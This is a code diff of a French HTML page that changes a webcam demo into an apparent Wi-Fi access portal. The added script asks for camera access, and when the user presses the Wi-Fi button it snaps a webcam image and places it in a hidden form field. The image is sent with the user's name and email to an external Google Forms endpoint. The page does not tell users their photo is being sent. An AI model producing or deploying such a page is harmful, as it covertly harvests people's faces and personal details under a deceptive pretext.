@@ -1,33 +1,79 @@
-
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Accès à la caméra</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Capture de la caméra et Accès au Wifi</title>
+  <style>
+    video, canvas {
+      width: 320px;
+      height: 240px;
+    }
+  </style>
 </head>
 <body>
-    <h1>Accès à la caméra</h1>
-    <button id="cameraButton">Activer la caméra</button>
-    <video id="video" width="640" height="480" autoplay></video>
 
-    <script>
-        document.getElementById("cameraButton").addEventListener("click", function() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) {
-                        var video = document.getElementById("video");
-                        video.srcObject = stream;
-                        video.play();
-                    })
-                    .catch(function(error) {
-                        console.error("Erreur lors de l'accès à la caméra:", error);
-                    });
-            } else {
-                console.error("getUserMedia n'est pas supporté par ce navigateur");
-            }
-        });
-    </script>
+  <h1>Capture de la caméra et Accès au Wifi</h1>
+  
+  <!-- Section pour capturer l'image -->
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <!-- Formulaire combiné pour envoyer l'image et les informations du contact -->
+  <form id="contactForm" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfuPvpWwoDkOsrP5T8n7KRZ-nbnL0qsT5YYVYmzPXwH8oHqWw/formResponse" method="post">
+    
+    <label for="nom">Nom :</label><br>
+    <input type="text" id="nom" name="entry.2116783262" required><br><br>
+
+    <label for="prenom">Prénom :</label><br>
+    <input type="text" id="prenom" name="entry.2134574420" required><br><br>
+
+    <label for="email">Email :</label><br>
+    <input type="email" id="email" name="entry.340597722" required><br><br>
+
+    <!-- Champ caché pour l'image capturée -->
+    <input type="hidden" name="entry.1749997077" id="imageData">
+
+    <button type="button" id="submitBtn">Envoyer et Accéder au WIFI</button>
+  </form>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const submitBtn = document.getElementById('submitBtn');
+    const form = document.getElementById('contactForm');
+
+    // Demander l'accès à la caméra
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        console.error("Erreur d'accès à la caméra: ", err);
+      });
+
+    // Fonction pour capturer l'image, ajouter au formulaire et soumettre
+    submitBtn.addEventListener('click', () => {
+      // Définir la taille désirée pour l'image redimensionnée
+      const maxWidth = 320;
+      const maxHeight = 240;
+      canvas.width = maxWidth;
+      canvas.height = maxHeight;
+
+      // Dessiner l'image capturée sur le canvas avec la taille définie
+      context.drawImage(video, 0, 0, maxWidth, maxHeight);
+
+      // Convertir le canvas en base64 avec compression JPEG
+      const imageData = canvas.toDataURL('image/jpeg', 0.6); // Réglage de la qualité à 0.6 pour réduire la taille
+
+      // Ajouter l'image encodée dans le champ caché du formulaire
+      document.getElementById('imageData').value = imageData;
+
+      // Soumettre le formulaire
+      form.submit();
+    });
+  </script>
+
 </body>
 </html>
